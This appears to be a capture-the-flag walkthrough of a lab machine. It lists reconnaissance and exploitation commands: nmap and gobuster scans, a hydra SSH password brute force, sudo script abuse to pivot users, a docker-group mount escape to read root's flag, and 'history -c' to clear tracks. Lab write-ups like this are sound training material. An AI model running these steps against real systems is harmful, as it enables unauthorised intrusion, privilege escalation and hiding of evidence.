1.  **RECONNAISANCE**

   | Tool | Screenshot | Description |
| :--- | :--- | :--- |
| netdiscover | <img width="459" height="154" alt="image" src="https://github.com/user-attachments/assets/4b6c656f-09fc-4f33-ab08-df3c918846a0" /> | Target - 192.168.56.101  |
| nmap -sn 192.168.56.0/24 | <img width="468" height="213" alt="image" src="https://github.com/user-attachments/assets/bb67b7dc-752e-4b72-ba3a-dd0f698fcb2b" /> | Identified there were four live devices active hosts within the 192.168.56.0/24 subnet.|



<br> 2.  **SCANNING**

   | Tool | Screenshot | Description |
| :--- | :--- | :--- |
| nmap -sC -Sv -Pn -vv 192.168.56.101 | <img width="467" height="344" alt="image" src="https://github.com/user-attachments/assets/f2c37e95-d306-4ee0-9382-8613a0989963" />| Discovered Port 21 (ftp), Port 22 (SSH), and Port 80 (http) were open |
| gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | <img width="658" height="408" alt="image" src="https://github.com/user-attachments/assets/81312b43-bc77-49e5-92d9-c459a5782741" />|  Discovered a directory called hidden_text|
| |  <img width="688" height="421" alt="image" src="https://github.com/user-attachments/assets/9efeba69-1b89-4b45-9af9-193df1dde922" /> | When opened the hidden_text page, a Thank You… link was provided |
| |<img width="704" height="425" alt="image" src="https://github.com/user-attachments/assets/1791f701-632a-42b5-b314-c44d16b9f9f7" />| When clicked on the link, it gave a QR code |
| |<img width="706" height="527" alt="image" src="https://github.com/user-attachments/assets/2fcee1f5-bcda-48dc-a034-6eee977bf365" /> | I used a QR online decoder to decode the QR and gained the user credentials. |

<br> 3.  **GAIN ACCESS**

   | Tool | Screenshot | Description |
| :--- | :--- | :--- |
   |ftp 192.168.56.101 and ls |<img width="497" height="353" alt="image" src="https://github.com/user-attachments/assets/33ffc8de-431e-4d47-8930-51907ca65c65" /> <img width="513" height="76" alt="image" src="https://github.com/user-attachments/assets/b9417048-421d-4b04-9cae-f2c6444b9897" />  | Login to FTP with the given credentials and list down the files (information.txt and p_lists.txt). |
| cat information.txt |<img width="513" height="106" alt="image" src="https://github.com/user-attachments/assets/924a30ec-6b1e-4e9f-8cec-7a3f2bd0ad71" /> | View the information.txt file. |
| cat p_lists.txt | <img width="514" height="375" alt="image" src="https://github.com/user-attachments/assets/4b99e855-8a9f-4ba9-bbef-51609a191f49" />| View the p_lists.txt file where I got a list of possible passwords. |
| hydra -l robin -P p_lists.txt ssh://192.168.56.101 | <img width="509" height="284" alt="image" src="https://github.com/user-attachments/assets/b6115e84-39ba-46d0-974a-e884744da00c" /> | Use the hydra to crack the password from the possible password lists. |
| ssh robin@192.168.56.101 | <img width="500" height="314" alt="image" src="https://github.com/user-attachments/assets/5200db2b-2f42-4c55-9978-27fea0371f15" /> | Use ssh to login as Robin. |
| cat user1.txt| <img width="519" height="382" alt="image" src="https://github.com/user-attachments/assets/705a93c8-076e-432f-8e83-b6a959ded9c3" />| Obtained the first flag. |
| sudo -l |<img width="514" height="121" alt="image" src="https://github.com/user-attachments/assets/ec072c50-8d61-49f4-86e9-0976595b5fef" /> | Use the sudo -l to list down what the user can do. |
| sudo -u jerry /home/robin/project/feedback.sh |<img width="523" height="31" alt="image" src="https://github.com/user-attachments/assets/8cd5b2eb-33b5-493f-a7b4-039c31994145" /> | Use a vulnerable sudo script for vertical privilege escalation from robin to jerry to view the feedback.sh file. |

<br> 4.  **MAINTAIN ACCESS**

   | Tool | Screenshot | Descsription |
| :--- | :--- | :--- |
| cat /home/jerry/user2.txt | <img width="516" height="339" alt="image" src="https://github.com/user-attachments/assets/cb657f1b-60fc-43bc-b94d-b5d848339da8" />| Type cat /home/jerry/user2.txt in the feedback section. Then, we obtained the second flag from home directory of jerry. |

<br> 5.  **ESCALATE PRIVILEGES**

   | Tool | Screenshot | Descsription |
| :--- | :--- | :--- |
| id and docker run -v /:/mnt –rm -it alpine cat /mnt/root/root.txt| <img width="508" height="343" alt="image" src="https://github.com/user-attachments/assets/3f5f674a-db13-4403-bd28-68d52b3ecc7f" />|  Use the id to check jerry’s profile and discovered he belong to the docker group. Then I used a docker command to trick the system into letting me see the forbidden Root folder which let me read the final flag.|

<br> 6.  **CLEAR TRACKS**: history -c
